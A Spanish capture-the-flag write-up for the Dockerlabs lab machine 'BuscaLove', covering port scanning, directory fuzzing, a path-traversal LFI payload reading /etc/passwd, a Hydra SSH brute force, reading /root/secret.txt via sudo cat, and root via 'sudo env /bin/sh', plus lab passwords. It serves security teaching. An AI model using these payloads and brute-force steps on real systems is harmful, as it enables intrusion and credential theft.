## BuscaLove
### Plataforma: Dockerlabs
### Nivel: Fácil
### url: https://dockerlabs.es/
##
### WriteUp realizado por afgsanchez: https://afgsanchez.pythonanywhere.com/
##

#### Reconocimiento
Comenzamos con una exploración inicial utilizando nmap para identificar los servicios y puertos abiertos.

Resultado: Se identifica un servicio HTTP en puerto 80 y un servicio SSH en el puerto 22.

```
└─# nmap -p- 172.18.0.2 -n -Pn -vvv -sS --min-rate 4000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 21:26 CEST
Initiating ARP Ping Scan at 21:26
Scanning 172.18.0.2 [1 port]
Completed ARP Ping Scan at 21:26, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:26
Scanning 172.18.0.2 [65535 ports]
Discovered open port 22/tcp on 172.18.0.2
Discovered open port 80/tcp on 172.18.0.2
Completed SYN Stealth Scan at 21:26, 0.30s elapsed (65535 total ports)
Nmap scan report for 172.18.0.2
Host is up, received arp-response (0.0000020s latency).
Scanned at 2024-07-12 21:26:26 CEST for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:12:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Reviso el servicio http en el navegador, es una pagina por defecto de la instalacion de Apache 2
![image](https://github.com/user-attachments/assets/80a947cb-d9f4-495c-8488-f8cd49517704)

Se utiliza gobuster para buscar directorios ocultos en el servidor web.
Resultado: Se localiza un directorio llamado "wordpress".
```
└─# gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/wordpress            (Status: 301) [Size: 312] [--> http://172.18.0.2/wordpress/]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```
Reviso el directorio en el navegador:
![image](https://github.com/user-attachments/assets/72781e9f-4f33-4fc0-a15c-5a62fd9134d3)

Vuelvo a hacer fuzzing pero esta vez a partir del nuevo directorio.
Uso varias herramientas pero no hay ningún resultado positivo.
```
└─# dirsearch -u 172.18.0.2/wordpress
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/dockerlabs/buscalove/reports/_172.18.0.2/_wordpress_24-07-12_21-34-14.txt

Target: http://172.18.0.2/

[21:34:14] Starting: wordpress/  

```

Reviso el codigo fuente de la web y observo un comentario:

```
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mi página web</title>
  <link rel="stylesheet" href="style.css">
<!-- El desarollo de esta web esta en fase verde muy verde te dejo aqui la ventana abierta con mucho love para los curiosos que gustan de leer -->
 </head>
```
Despues de darle un par de vueltas, probando como directorio la palabra love, caigo en que el mensaje habla de love, pero tambien habla de lectura y tambien comenta “la ventana”, entonces me viene a la cabeza el escritor H.P. Lovecraft

Busco en el Poema “La ventana”, creo un diccionario usando cewl, le doy mil vueltas pero es un callejon sin salida.

![image](https://github.com/user-attachments/assets/342c412d-37d7-4698-b633-5e964e0c4714)


Cambio de estrategia enfocandolo desde otro punto de vista. ¿Será vulnerable a LFI?
Sigo convencido que la palabra love tiene algo que ver, asi que...

```
http://172.18.0.2/wordpress/index.php?love=../../../../../etc/passwd
```
BINGO!

![image](https://github.com/user-attachments/assets/363da62a-5e3c-4c69-a46f-7adce9807ae9)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
pedro:x:1001:1001::/home/pedro:/bin/bash
rosa:x:1002:1002::/home/rosa:/bin/bash
```


Voy a probar por ssh con hydra y tengo la sensación que debo atacar al usuario “rosa”.

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-12 22:23:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344403 login tries (l:1/p:14344403), ~896526 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[STATUS] 151.00 tries/min, 151 tries in 00:01h, 14344253 to do in 1583:16h, 15 active
[STATUS] 105.33 tries/min, 316 tries in 00:03h, 14344088 to do in 2269:39h, 15 active
[STATUS] 99.00 tries/min, 693 tries in 00:07h, 14343711 to do in 2414:46h, 15 active
[22][ssh] host: 172.18.0.2   login: rosa   password: lovebug
<finished>
```

Conecto por ssh!

```
└─# ssh rosa@172.18.0.2                                   
The authenticity of host '172.18.0.2 (172.18.0.2)' can't be established.
ED25519 key fingerprint is SHA256:ECC1astozO7Vfbm1ebeRXC1STGBRfHKV0RnpBAtAuX4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.18.0.2' (ED25519) to the list of known hosts.
rosa@172.18.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.15-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri May 31 08:44:21 2024 from 172.17.0.1
rosa@6941a520760d:~$
```
Perfecto. 
Es una máquina nivel fácil, así que vamos a lo típico: sudo -l

```
rosa@6941a520760d:~$ pwd
/home/rosa
rosa@6941a520760d:~$ sudo -l
Matching Defaults entries for rosa on 6941a520760d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rosa may run the following commands on 6941a520760d:
    (ALL) NOPASSWD: /usr/bin/ls, /usr/bin/cat
```
Podemos listar directorios con permisos root con /usr/bin/ls
Tambien podemos leer archivos con permisos de root con el comando /usr/bin/cat.

Vamos a examinar el directorio /root a ver si se oculta algo.
Usando ls descubrimos el archivo /root/secret.txt.
Uso el comando cat como sudo para leer el archivo.

```
rosa@6941a520760d:~$ sudo -u root ls -la /root
total 28
drwx------ 1 root root 4096 May 31 08:56 .
drwxr-xr-x 1 root root 4096 Jul 12 16:19 ..
-rw-r--r-- 1 root root 3106 Apr 22 10:04 .bashrc
drwxr-xr-x 3 root root 4096 May 20 17:07 .local
-rw-r--r-- 1 root root  161 Apr 22 10:04 .profile
drwx------ 2 root root 4096 May 20 16:52 .ssh
-rw-r--r-- 1 root root   72 May 20 19:13 secret.txt
rosa@6941a520760d:~$ sudo /usr/bin/cat /root/secret.txt
4E 5A 58 57 43 59 33 46 4F 4A 32 47 43 34 54 42 4F 4E 58 58 47 32 49 4B
```
Descubrimos un codigo hexadecimal. Vamos a pasarlo por cyberchef:

![image](https://github.com/user-attachments/assets/ae573e23-8e6c-44a1-86a3-a98e7802e668)

```
noacertarasosi
```

Despues de dsar varias vueltas al asunto, recuerdo que tenemos otro usuario: pedro
Tal vez esto sea un password.
Intento conexion por ssh con el usuario pedro y la contraseña noacertarasosi


```
└─# ssh pedro@172.18.0.2                                  
pedro@172.18.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.15-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu May 30 10:36:42 2024 from 172.17.0.1
pedro@6941a520760d:~$ 
```
Genial!

Vuelvo a probar sudo -l con el usuario pedro

```
pedro@6941a520760d:~$ sudo -l
Matching Defaults entries for pedro on 6941a520760d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User pedro may run the following commands on 6941a520760d:
    (ALL) NOPASSWD: /usr/bin/env
```
Podemos ejecutar como sudo el comando /usr/bin/env

Buscamos en GTFOBins si existe exploit.
Es bastante sencillo: sudo env /bin/sh

```
pedro@6941a520760d:~$ sudo env /bin/sh
# whoami
root
# 
```
FIN.

